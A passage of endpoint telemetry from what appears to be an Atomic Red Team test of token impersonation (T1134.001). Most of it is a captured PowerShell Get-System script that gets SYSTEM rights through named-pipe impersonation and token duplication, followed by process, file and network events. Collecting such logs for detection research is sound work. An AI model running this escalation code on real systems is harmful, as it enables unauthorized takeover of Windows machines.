Get-DelegateType @( [IntPtr], [Int], [Int]) ([IntPtr])\n        $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)\n\n        $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService\n        $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([IntPtr])\n        $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)\n\n        $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError\n        $GetLastErrorDelegate = Get-DelegateType @() ([Int])\n        $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)\n\n        # Step 1 - OpenSCManager()\n        # 0xF003F = SC_MANAGER_ALL_ACCESS\n        #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx\n        Write-Verbose \"Opening service manager\"\n        $ManagerHandle = $OpenSCManagerA.Invoke(\"\\\\localhost\", \"ServicesActive\", 0xF003F)\n        Write-Verbose \"Service manager handle: $ManagerHandle\"\n\n        # if we get a non-zero handle back, everything was successful\n        if ($ManagerHandle -and ($ManagerHandle -ne 0)) {\n\n            # Step 2 - CreateService()\n            # 0xF003F = SC_MANAGER_ALL_ACCESS\n            # 0x10 = SERVICE_WIN32_OWN_PROCESS\n            # 0x3 = SERVICE_DEMAND_START\n            # 0x1 = SERVICE_ERROR_NORMAL\n            Write-Verbose \"Creating new service: '$ServiceName'\"\n            try {\n                $ServiceHandle = $CreateServiceA.Invoke($ManagerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, $Command, $null, $null, $null, $null, $null)\n                $err = $GetLastError.Invoke()\n            }\n            catch {\n                Write-Warning \"Error creating service : $_\"\n                $ServiceHandle = 0\n            }\n            Write-Verbose \"CreateServiceA Handle: $ServiceHandle\"\n\n            if ($ServiceHandle -and ($ServiceHandle -ne 0)) {\n                $Success = $True\n                Write-Verbose \"Service successfully created\"\n\n                # Step 3 - CloseServiceHandle() for the service handle\n                Write-Verbose \"Closing service handle\"\n                $Null = $CloseServiceHandle.Invoke($ServiceHandle)\n\n                # Step 4 - OpenService()\n                Write-Verbose \"Opening the service '$ServiceName'\"\n                $ServiceHandle = $OpenServiceA.Invoke($ManagerHandle, $ServiceName, 0xF003F)\n                Write-Verbose \"OpenServiceA handle: $ServiceHandle\"\n\n                if ($ServiceHandle -and ($ServiceHandle -ne 0)){\n\n                    # Step 5 - StartService()\n                    Write-Verbose \"Starting the service\"\n                    $val = $StartServiceA.Invoke($ServiceHandle, $null, $null)\n                    $err = $GetLastError.Invoke()\n\n                    # if we successfully started the service, let it breathe and then delete it\n                    if ($val -ne 0){\n                        Write-Verbose \"Service successfully started\"\n                        # breathe for a second\n                        Start-Sleep -s 1\n                    }\n                    else{\n                        if ($err -eq 1053){\n                            Write-Verbose \"Command didn't respond to start\"\n                        }\n                        else{\n                            Write-Warning \"StartService failed, LastError: $err\"\n                        }\n                        # breathe for a second\n                        Start-Sleep -s 1\n                    }\n\n                    # start cleanup\n                    # Step 6 - DeleteService()\n                    Write-Verbose \"Deleting the service '$ServiceName'\"\n                    $val = $DeleteService.invoke($ServiceHandle)\n                    $err = $GetLastError.Invoke()\n\n                    if ($val -eq 0){\n                        Write-Warning \"DeleteService failed, LastError: $err\"\n                    }\n                    else{\n                        Write-Verbose \"Service successfully deleted\"\n                    }\n                \n                    # Step 7 - CloseServiceHandle() for the service handle \n                    Write-Verbose \"Closing the service handle\"\n                    $val = $CloseServiceHandle.Invoke($ServiceHandle)\n                    Write-Verbose \"Service handle closed off\"\n                }\n                else {\n                    Write-Warning \"[!] OpenServiceA failed, LastError: $err\"\n                }\n            }\n\n            else {\n                Write-Warning \"[!] CreateService failed, LastError: $err\"\n            }\n\n            # final cleanup - close off the manager handle\n            Write-Verbose \"Closing the manager handle\"\n            $Null = $CloseServiceHandle.Invoke($ManagerHandle)\n        }\n        else {\n            # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx\n            Write-Warning \"[!] OpenSCManager failed, LastError: $err\"\n        }\n\n        if($Success) {\n            Write-Verbose \"Waiting for pipe connection\"\n            $Pipe.WaitForConnection()\n\n            $Null = (New-Object System.IO.StreamReader($Pipe)).ReadToEnd()\n\n            $Out = $ImpersonateNamedPipeClient.Invoke([Int]$PipeHandle)\n            Write-Verbose \"ImpersonateNamedPipeClient: $Out\"\n        }\n\n        # clocse off the named pipe\n        $Pipe.Dispose()\n    }\n\n    # performs token duplication to elevate to SYSTEM\n    #   needs SeDebugPrivilege\n    # written by @mattifestation and adapted from https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot\n    Function Local:Get-SystemToken {\n        [CmdletBinding()] param()\n\n        $DynAssembly = New-Object Reflection.AssemblyName('AdjPriv')\n        $AssemblyBuilder = [Appdomain]::Currentdomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)\n        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('AdjPriv', $False)\n        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\n        $TokPriv1LuidTypeBuilder = $ModuleBuilder.DefineType('TokPriv1Luid', $Attributes, [System.ValueType])\n        $TokPriv1LuidTypeBuilder.DefineField('Count', [Int32], 'Public') | Out-Null\n        $TokPriv1LuidTypeBuilder.DefineField('Luid', [Int64], 'Public') | Out-Null\n        $TokPriv1LuidTypeBuilder.DefineField('Attr', [Int32], 'Public') | Out-Null\n        $TokPriv1LuidStruct = $TokPriv1LuidTypeBuilder.CreateType()\n\n        $LuidTypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType])\n        $LuidTypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null\n        $LuidTypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null\n        $LuidStruct = $LuidTypeBuilder.CreateType()\n\n        $Luid_and_AttributesTypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType])\n        $Luid_and_AttributesTypeBuilder.DefineField('Luid', $LuidStruct, 'Public') | Out-Null\n        $Luid_and_AttributesTypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null\n        $Luid_and_AttributesStruct = $Luid_and_AttributesTypeBuilder.CreateType()\n\n        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]\n        $ConstructorValue = [Runtime.InteropServices.UnmanagedType]::ByValArray\n        $FieldArray = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))\n\n        $TokenPrivilegesTypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType])\n        $TokenPrivilegesTypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null\n        $PrivilegesField = $TokenPrivilegesTypeBuilder.DefineField('Privileges', $Luid_and_AttributesStruct.MakeArrayType(), 'Public')\n        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 1))\n        $PrivilegesField.SetCustomAttribute($AttribBuilder)\n        $TokenPrivilegesStruct = $TokenPrivilegesTypeBuilder.CreateType()\n\n        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(\n            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),\n            'advapi32.dll',\n            @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')),\n            @([Bool] $True)\n        )\n\n        $AttribBuilder2 = New-Object Reflection.Emit.CustomAttributeBuilder(\n            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),\n            'kernel32.dll',\n            @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')),\n            @([Bool] $True)\n        )\n\n        $Win32TypeBuilder = $ModuleBuilder.DefineType('Win32Methods', $Attributes, [ValueType])\n        $Win32TypeBuilder.DefinePInvokeMethod(\n            'OpenProcess',\n            'kernel32.dll',\n            [Reflection.MethodAttributes] 'Public, Static',\n            [Reflection.CallingConventions]::Standard,\n            [IntPtr],\n            @([UInt32], [Bool], [UInt32]),\n            [Runtime.InteropServices.CallingConvention]::Winapi,\n            'Auto').SetCustomAttribute($AttribBuilder2)\n\n        $Win32TypeBuilder.DefinePInvokeMethod(\n            'CloseHandle',\n            'kernel32.dll',\n            [Reflection.MethodAttributes] 'Public, Static',\n            [Reflection.CallingConventions]::Standard,\n            [Bool],\n            @([IntPtr]),\n            [Runtime.InteropServices.CallingConvention]::Winapi,\n            'Auto').SetCustomAttribute($AttribBuilder2)\n\n        $Win32TypeBuilder.DefinePInvokeMethod(\n            'DuplicateToken',\n            'advapi32.dll',\n            [Reflection.MethodAttributes] 'Public, Static',\n            [Reflection.CallingConventions]::Standard,\n            [Bool],\n            @([IntPtr], [Int32], [IntPtr].MakeByRefType()),\n            [Runtime.InteropServices.CallingConvention]::Winapi,\n            'Auto').SetCustomAttribute($AttribBuilder)\n\n        $Win32TypeBuilder.DefinePInvokeMethod(\n            'SetThreadToken',\n            'advapi32.dll',\n            [Reflection.MethodAttributes] 'Public, Static',\n            [Reflection.CallingConventions]::Standard,\n            [Bool],\n            @([IntPtr], [IntPtr]),\n            [Runtime.InteropServices.CallingConvention]::Winapi,\n            'Auto').SetCustomAttribute($AttribBuilder)\n\n        $Win32TypeBuilder.DefinePInvokeMethod(\n            'OpenProcessToken',\n            'advapi32.dll',\n            [Reflection.MethodAttributes] 'Public, Static',\n            [Reflection.CallingConventions]::Standard,\n            [Bool],\n            @([IntPtr], [UInt32], [IntPtr].MakeByRefType()),\n            [Runtime.InteropServices.CallingConvention]::Winapi,\n            'Auto').SetCustomAttribute($AttribBuilder)\n\n        $Win32TypeBuilder.DefinePInvokeMethod(\n            'LookupPrivilegeValue',\n            'advapi32.dll',\n            [Reflection.MethodAttributes] 'Public, Static',\n            [Reflection.CallingConventions]::Standard,\n            [Bool],\n            @([String], [String], [IntPtr].MakeByRefType()),\n            [Runtime.InteropServices.CallingConvention]::Winapi,\n            'Auto').SetCustomAttribute($AttribBuilder)\n\n        $Win32TypeBuilder.DefinePInvokeMethod(\n            'AdjustTokenPrivileges',\n            'advapi32.dll',\n            [Reflection.MethodAttributes] 'Public, Static',\n            [Reflection.CallingConventions]::Standard,\n            [Bool],\n            @([IntPtr], [Bool], $TokPriv1LuidStruct.MakeByRefType(),[Int32], [IntPtr], [IntPtr]),\n            [Runtime.InteropServices.CallingConvention]::Winapi,\n            'Auto').SetCustomAttribute($AttribBuilder)\n        \n        $Win32Methods = $Win32TypeBuilder.CreateType()\n\n        $Win32Native = [Int32].Assembly.GetTypes() | ? {$_.Name -eq 'Win32Native'}\n        $GetCurrentProcess = $Win32Native.GetMethod(\n            'GetCurrentProcess',\n            [Reflection.BindingFlags] 'NonPublic, Static'\n        )\n            \n        $SE_PRIVILEGE_ENABLED = 0x00000002\n        $STANDARD_RIGHTS_REQUIRED = 0x000F0000\n        $STANDARD_RIGHTS_READ = 0x00020000\n        $TOKEN_ASSIGN_PRIMARY = 0x00000001\n        $TOKEN_DUPLICATE = 0x00000002\n        $TOKEN_IMPERSONATE = 0x00000004\n        $TOKEN_QUERY = 0x00000008\n        $TOKEN_QUERY_SOURCE = 0x00000010\n        $TOKEN_ADJUST_PRIVILEGES = 0x00000020\n        $TOKEN_ADJUST_GROUPS = 0x00000040\n        $TOKEN_ADJUST_DEFAULT = 0x00000080\n        $TOKEN_ADJUST_SESSIONID = 0x00000100\n        $TOKEN_READ = $STANDARD_RIGHTS_READ -bor $TOKEN_QUERY\n        $TOKEN_ALL_ACCESS = $STANDARD_RIGHTS_REQUIRED -bor\n            $TOKEN_ASSIGN_PRIMARY -bor\n            $TOKEN_DUPLICATE -bor\n            $TOKEN_IMPERSONATE -bor\n            $TOKEN_QUERY -bor\n            $TOKEN_QUERY_SOURCE -bor\n            $TOKEN_ADJUST_PRIVILEGES -bor\n            $TOKEN_ADJUST_GROUPS -bor\n            $TOKEN_ADJUST_DEFAULT -bor\n            $TOKEN_ADJUST_SESSIONID\n\n        [long]$Luid = 0\n\n        $tokPriv1Luid = [Activator]::CreateInstance($TokPriv1LuidStruct)\n        $tokPriv1Luid.Count = 1\n        $tokPriv1Luid.Luid = $Luid\n        $tokPriv1Luid.Attr = $SE_PRIVILEGE_ENABLED\n\n        $RetVal = $Win32Methods::LookupPrivilegeValue($Null, \"SeDebugPrivilege\", [ref]$tokPriv1Luid.Luid)\n\n        $htoken = [IntPtr]::Zero\n        $RetVal = $Win32Methods::OpenProcessToken($GetCurrentProcess.Invoke($Null, @()), $TOKEN_ALL_ACCESS, [ref]$htoken)\n\n        $tokenPrivileges = [Activator]::CreateInstance($TokenPrivilegesStruct)\n        $RetVal = $Win32Methods::AdjustTokenPrivileges($htoken, $False, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)\n\n        if(-not($RetVal)) {\n            Write-Error \"AdjustTokenPrivileges failed, RetVal : $RetVal\" -ErrorAction Stop\n        }\n        \n        $LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value\n\n        $SystemHandle = Get-WmiObject -Class Win32_Process | ForEach-Object {\n            try {\n                $OwnerInfo = $_.GetOwner()\n                if ($OwnerInfo.Domain -and $OwnerInfo.User) {\n                    $OwnerString = \"$($OwnerInfo.Domain)\\$($OwnerInfo.User)\".ToUpper()\n\n                    if ($OwnerString -eq $LocalSystemNTAccount.ToUpper()) {\n                        $Process = Get-Process -Id $_.ProcessId\n\n                        $Handle = $Win32Methods::OpenProcess(0x0400, $False, $Process.Id)\n                        if ($Handle) {\n                            $Handle\n                        }\n                    }\n                }\n            }\n            catch {}\n        } | Where-Object {$_ -and ($_ -ne 0)} | Select -First 1\n        \n        if ((-not $SystemHandle) -or ($SystemHandle -eq 0)) {\n            Write-Error 'Unable to obtain a handle to a system process.'\n        } \n        else {\n            [IntPtr]$SystemToken = [IntPtr]::Zero\n            $RetVal = $Win32Methods::OpenProcessToken(([IntPtr][Int] $SystemHandle), ($TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE), [ref]$SystemToken);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()\n\n            Write-Verbose \"OpenProcessToken result: $RetVal\"\n            Write-Verbose \"OpenProcessToken result: $LastError\"\n\n            [IntPtr]$DulicateTokenHandle = [IntPtr]::Zero\n            $RetVal = $Win32Methods::DuplicateToken($SystemToken, 2, [ref]$DulicateTokenHandle);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()\n\n            Write-Verbose \"DuplicateToken result: $LastError\"\n\n            $RetVal = $Win32Methods::SetThreadToken([IntPtr]::Zero, $DulicateTokenHandle);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()\n            if(-not($RetVal)) {\n                Write-Error \"SetThreadToken failed, RetVal : $RetVal\" -ErrorAction Stop\n            }\n\n            Write-Verbose \"SetThreadToken result: $LastError\"\n            $null = $Win32Methods::CloseHandle($Handle)\n        }\n    }\n\n    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {\n        Write-Error \"Script must be run as administrator\" -ErrorAction Stop\n    }\n\n    if([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') {\n        Write-Error \"Script must be run in STA mode, relaunch powershell.exe with -STA flag\" -ErrorAction Stop\n    }\n\n    if($PSBoundParameters['WhoAmI']) {\n        Write-Output \"$([Environment]::UserDomainName)\\$([Environment]::UserName)\"\n        return\n    }\n\n    elseif($PSBoundParameters['RevToSelf']) {\n        $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf\n        $RevertToSelfDelegate = Get-DelegateType @() ([Bool])\n        $RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)\n\n        $RetVal = $RevertToSelf.Invoke()\n        if($RetVal) {\n            Write-Output \"RevertToSelf successful.\"\n        }\n        else {\n            Write-Warning \"RevertToSelf failed.\"\n        }\n        Write-Output \"Running as: $([Environment]::UserDomainName)\\$([Environment]::UserName)\"\n    }\n\n    else {\n        if($Technique -eq 'NamedPipe') {\n            # if we're using named pipe impersonation with a service\n            Get-SystemNamedPipe -ServiceName $ServiceName -PipeName $PipeName\n        }\n        else {\n            # otherwise use token duplication\n            Get-SystemToken\n        }\n        Write-Output \"Running as: $([Environment]::UserDomainName)\\$([Environment]::UserName)\"\n    }\n}\n { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }","pid":12216,"app_name":"PowerShell_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\POWERSHELL.exe_10.0.19041.1"}}
{"evt_type":"P","ts":1697145886146361600,"evt_process":{"cmdline":"timeout /t 3","pid":12832,"parent_pid":6820,"exe_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\timeout.exe","unique_pid":"3940649673969403","parent_unique_pid":"3940649673969401"}}
{"evt_type":"P","ts":1697145886146361600,"evt_process":{"cmdline":"C:\\Windows\\system32\\cmd.exe /C timeout /t 3 \u003enul\u0026\u0026echo TestSVC \u003e \\\\.\\pipe\\TestSVC","pid":6820,"parent_pid":9436,"exe_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\cmd.exe","unique_pid":"3940649673969401","parent_unique_pid":"3940649673969400"}}
{"evt_type":"P","ts":1697145886146361600,"evt_process":{"cmdline":"\\??\\C:\\Windows\\system32\\conhost.exe 0x4","pid":8304,"parent_pid":6820,"exe_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\conhost.exe","unique_pid":"3940649673969402","parent_unique_pid":"3940649673969401"}}
{"evt_type":"F","ts":1697145886162003700,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Windows\\Prefetch\\TIMEOUT.EXE-6A795FFD.pf"}}
{"evt_type":"N","ts":1697145886177741200,"evt_netflow":{"flow_str":"tcp:10.0.0.6:61994-\u003e185.199.111.133:443","pid":12216}}
{"evt_type":"P","ts":1697145886177741200,"evt_process":{"cmdline":"\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe POWERSHELL -ExecutionPolicy Bypass -NoProfile C:\\Users\\QUANTU~1\\AppData\\Local\\Temp\\artwork-T1134.001_1-2307143491\\goart-T1134.001-test.ps1","pid":12216,"parent_pid":9636,"exe_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","unique_pid":"3940649673969399","parent_unique_pid":"3940649673969398"}}
{"evt_type":"F","ts":1697145886226115500,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\T1134.001_1_90db9e27\\run_summary.json"}}
{"evt_type":"F","ts":1697145886226115500,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\T1134.001_1_90db9e27\\run_summary.json"}}
{"evt_type":"P","ts":1697145886227331300,"evt_process":{"cmdline":"C:\\atomic-test\\atomic-harness\\bin\\goartrun.exe --config .\\testruns\\harness-results-3520744085\\T1134.001_1_90db9e27\\runspec.json","pid":9636,"parent_pid":11128,"exe_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\bin\\goartrun.exe","unique_pid":"3940649673969398","parent_unique_pid":"3940649673969396"}}
{"evt_type":"F","ts":1697145886241276700,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\T1134.001_1_90db9e27\\runner-stdout.txt"}}
{"evt_type":"F","ts":1697145886241787500,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\T1134.001_1_90db9e27\\runner-stdout.txt"}}
{"evt_type":"F","ts":1697145886243087900,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\status.json"}}
{"evt_type":"F","ts":1697145886243632600,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\status.txt"}}
{"evt_type":"F","ts":1697145886244783000,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\artwork-T1134.001_1-2307143491\\goart-T1134.001-test.ps1"}}
{"evt_type":"F","ts":1697145886244783000,"evt_file":{"action":"DELETE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\artwork-T1134.001_1-2307143491\\goart-T1134.001-test.ps1"}}
{"evt_type":"F","ts":1697145886245319900,"evt_file":{"action":"DELETE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\artwork-T1134.001_1-2307143491"}}
{"evt_type":"E","ts":1697145882819399200,"evt_etw":{"chan_name":"Microsoft-Windows-PowerShell/Operational ","event_msg":"Creating Scriptblock text (%1 of %2):\r\n%3\r\n\r\nScriptBlock ID: %4\r\nPath: %5 ","event_data_list":"MessageNumber:1 MessageTotal:1 ScriptBlockText:$global:? ScriptBlockId:e87a6731-a2e4-4ac4-a500-d4c235206032 Path: ","pid":12216}}
{"evt_type":"P","ts":1697145889258219800,"evt_process":{"cmdline":"bin\\telemtool.exe --fetch --resultsdir .\\testruns\\harness-results-3520744085 --ts 1697145881,1697145889","pid":8560,"parent_pid":11128,"exe_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\bin\\telemtool.exe","unique_pid":"3940649673969404","parent_unique_pid":"3940649673969396"}}
